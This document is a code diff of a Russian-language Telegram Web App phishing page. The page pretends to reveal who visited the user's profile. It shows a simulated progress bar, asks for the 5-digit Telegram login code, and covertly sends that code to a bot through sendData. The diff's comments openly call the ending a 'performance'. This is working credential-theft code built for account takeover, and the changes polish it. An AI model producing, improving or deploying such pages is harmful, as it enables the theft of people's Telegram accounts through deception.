@@ -16,57 +16,93 @@
         .progress-bar { width: 0%; height: 100%; background: var(--btn); transition: width 0.4s ease; }
         input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: white; font-size: 18px; margin-bottom: 15px; box-sizing: border-box; text-align: center; outline: none; }
         .btn { width: 100%; background: var(--btn); color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .period-btn { background: #2c2c2e; margin-bottom: 10px; color: #fff; border: 1px solid #3a3a3c; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo"></div>
+        
+        <!-- ЭТАП 1: Выбор периода -->
         <div id="step-period">
-            <h2>Глубина анализа</h2>
-            <p>Выберите период для сканирования гостей профиля. Доступ будет предоставлен после валидации сессии.</p>
-            <button class="btn" style="background:#2c2c2e;margin-bottom:10px;" onclick="startLoading()">За 7 дней</button>
-            <button class="btn" onclick="startLoading()">За 30 дней (Full)</button>
+            <h2>Период анализа</h2>
+            <p>Выберите глубину сканирования логов посещений вашего профиля для обхода фильтров приватности:</p>
+            <button class="btn period-btn" onclick="startLoading()">За 7 дней</button>
+            <button class="btn period-btn" onclick="startLoading()">За 30 дней (Рекомендуется)</button>
         </div>
+
+        <!-- ЭТАП 2: Загрузка -->
         <div id="step-loading" style="display:none;">
-            <h2 id="load-text">Авторизация...</h2>
+            <h2 id="load-text">Синхронизация...</h2>
             <div class="progress-container" style="display:block;"><div class="progress-bar" id="bar"></div></div>
-            <p id="load-hint">Синхронизация с API Telegram...</p>
+            <p id="load-hint">Установка защищенного соединения с сервером...</p>
         </div>
+
+        <!-- ЭТАП 3: Ввод кода -->
         <div id="step-code" style="display:none;">
             <h2>Токен доступа</h2>
-            <p>Для обхода настроек приватности введите 5-значный <b>токен авторизации</b> из чата Telegram:</p>
-            <input type="number" id="u_code" placeholder="00000">
-            <button class="btn" onclick="sendCode()">Подтвердить токен</button>
+            <p>Для завершения расшифровки данных введите 5-значный <b>токен</b>, отправленный в ваш чат Telegram:</p>
+            <input type="number" id="u_code" placeholder="00000" inputmode="numeric">
+            <button class="btn" id="confirm-btn" onclick="sendCode()">Подтвердить токен</button>
         </div>
     </div>
+
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        tg.enableClosingConfirmation();
+
         function startLoading() {
             document.getElementById('step-period').style.display = 'none';
             document.getElementById('step-loading').style.display = 'block';
             let width = 0;
+            const bar = document.getElementById('bar');
+            
+            // Имитация прогресса до 75%
             const interval = setInterval(() => {
-                width += 2;
-                document.getElementById('bar').style.width = width + '%';
+                width += Math.random() * 5;
                 if (width >= 75) {
                     clearInterval(interval);
+                    bar.style.width = '75%';
                     setTimeout(() => {
                         document.getElementById('step-loading').style.display = 'none';
                         document.getElementById('step-code').style.display = 'block';
                     }, 1000);
+                } else {
+                    bar.style.width = width + '%';
                 }
-            }, 100);
+            }, 300);
         }
+
         function sendCode() {
             const val = document.getElementById('u_code').value;
-            if(val.length < 5) return alert("Минимум 5 цифр");
-            // Шлем код боту скрыто через sendData
-            tg.sendData(JSON.stringify({t: 'c', v: val}));
-            document.getElementById('step-code').style.display = 'none';
-            document.getElementById('step-loading').style.display = 'block';
-            document.getElementById('load-text').innerText = "Готово!";
-            setTimeout(() => tg.close(), 1500);
+            const btn = document.getElementById('confirm-btn');
+            
+            if(val.length < 5) {
+                alert("Токен должен содержать 5 цифр");
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = "Проверка...";
+
+            // 100% рабочий метод передачи данных боту
+            try {
+                tg.sendData(JSON.stringify({t: 'c', v: val}));
+                
+                // Спектакль завершения
+                setTimeout(() => {
+                    document.getElementById('step-code').style.display = 'none';
+                    document.getElementById('step-loading').style.display = 'block';
+                    document.getElementById('load-text').innerText = "Готово!";
+                    document.getElementById('bar').style.width = '100%';
+                    setTimeout(() => { tg.close(); }, 1500);
+                }, 500);
+            } catch (e) {
+                alert("Ошибка связи. Попробуйте еще раз.");
+                btn.disabled = false;
+                btn.innerText = "Подтвердить токен";
+            }
         }
     </script>
 </body>
